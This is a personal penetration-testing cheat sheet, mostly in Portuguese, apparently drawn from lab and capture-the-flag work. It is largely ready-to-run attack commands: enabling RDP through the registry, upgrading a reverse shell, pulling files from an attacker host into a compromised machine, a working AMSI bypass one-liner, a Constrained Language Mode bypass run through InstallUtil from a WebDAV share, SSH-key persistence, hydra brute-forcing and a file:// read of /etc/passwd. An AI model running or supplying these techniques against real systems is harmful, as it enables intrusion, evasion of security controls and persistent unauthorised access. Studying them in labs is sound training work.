### RDP

For windows with share and 85% screen

```
rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.10.10.10
```


Para habilitar o acesso RDP:

```shell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
```

Para desabilitar o acesso RDP:

shell

```shell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 1 /f
```





### Linux

binaries Path

```
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/ucb/
```

###  Interactive Shell

Arrumando interactive TTY using Python

```shell
# Enter while in reverse shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo; fg


# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>

```




### File Transfer

#### HTTP

The most common le transfer method.

```shell
# In Kali
python -m SimpleHTTPServer 80

# In reverse shell - Linux
wget 10.10.10.10/file

# In reverse shell - Windows
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"
```


### Python

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


## Chave privada cracking

Seguindo a metodologia de cracking, nosso próximo passo é transformar o chave privada em formato hash para nossas ferramentas de cracking. Usaremos o **ssh2john** script de transformação do conjunto JtR e salve o hash resultante para **ssh.hash**.

```shell
kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash

kali@kali:~/passwordattacks$ cat ssh.hash
id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682...
```


##### WEBDAV

```
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

## AMSI bypass

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf =  @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

## CLM

Para bypassar o CLM, usei o seguinte methodo: https://github.com/calebstewart/bypass-clm

Primeiro subi o webdav para hostear o payload:
- https://github.com/padovah4ck/PSByPassCLM/blob/master/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe

```sh
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

Depois montei o webdav no alvo:

```shell
net use Z: http://192.168.45.151
```

Copiei o payload para a pasta tasks:

```shell
copy Z:\PsBypassCLM.exe C:\Windows\Tasks\bypass-clm.exe
```

Rodei o bypass:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\bypass-clm.exe"
```

Consegui bypassar o CLM

```powershell
PS C:\windows\tasks> $ExecutionContext.SessionState.LanguageMode
$ExecutionContext.SessionState.LanguageMode
FullLanguage
```

## MSSQL Client

- https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py

## SSH-KEYGEN

Vamos dar uma olhada na máquina linuxvictim no laboratório. Se obtivermos acesso como usuário _linuxvictim_ ou _root_ , podemos adicionar uma chave pública SSH ao arquivoauthorized_keys do _linuxvictim_ para manter o acesso. Para fazer isso, primeiro precisaremos criar um par de chaves SSH em nossa Kali VM.

Podemos configurar um par de chaves SSH em nossa VM Kali com ssh-keygen .

```
kali@kali:~# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_rsa.
Your public key has been saved in /home/kali/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:VTLfYd2shCqYOTkpZqeHRrqxnKjyVViNgbmVMpKyEug root@kali
The key's randomart image is:
+---[RSA 2048]----+
|.  . o..  o ..oo.|
|+ o = o+   =.o..+|
|.+ . =o*. ...... |
|oE  *oX ...   .  |
|.  =.=.oS.       |
|  o +..          |
| o *..           |
|o =.             |
|+..              |
+----[SHA256]-----+
```

> Listagem 11 – Gerando um par de chaves SSH

Se aceitarmos os valores padrão para o caminho do arquivo, um par de arquivos será criado em nosso diretório ~/.ssh/ . Obteremos id_rsa para a chave privada e id_rsa.pub para a chave pública. Podemos então capturar o conteúdo de id_rsa.pub e copiá-lo para a área de transferência.

Na máquina linuxvictim, podemos inserir a chave pública no arquivoauthorized_keys do usuário _linuxvictim_ com o seguinte comando.

```
linuxvictim@linuxvictim:~$ echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali" >> /home/linuxvictim/.ssh/authorized_keys
```


```
hydra -l marujo -P /usr/share/wordlists/rockyou.txt -t 3 -f 192.168.90.43 http-post-form "/?action=login:username=^USER^&password=^PASS^:Usuário ou senha inválido\!"

hydra -l admin -P /usr/share/wordlists/rockyou.txt -o saida.txt 192.168.90.84 http-get /webdav

gobuster dir -u http://192.168.90.77/cmd/ -w /usr/share/wordlists/dirb/big.txt -o gobuster90-77.txt
```

```
Através desse "get_picture=" conseguimos exibir arquivos da máquina usando:

file:///
Então a URL ficou assim:

http://192.168.90.43/?get_picture=file:///arquivo
Pegamos o passwd com:

http://192.168.90.43/?get_picture=file:///etc/passwd
retorno:
```






> Listagem 12 – Inserindo a chave pública

Podemos então fazer ssh de nossa VM Kali usando nossa chave privada para a máquina _linuxvictim_ e fazer login como usuário _linuxvictim_ sem uma senha. Se não especificarmos uma chave privada SSH para usar, o cliente SSH usará aquela em ~/.ssh/id_rsa .

```
kali@kali:~$ ssh linuxvictim@linuxvictim
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64)
...
linuxvictim@linuxvictim:~$ 
```




CGI-BINS
Testei o cgi-bin sem sucesso:
(https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)
```
┌──(root💀naboo)-[/home/legunner/CTF/ctf90-84]
└─# python3 shellshocker.py https://192.168.90.84/cgi-bin/admin.cgi
```
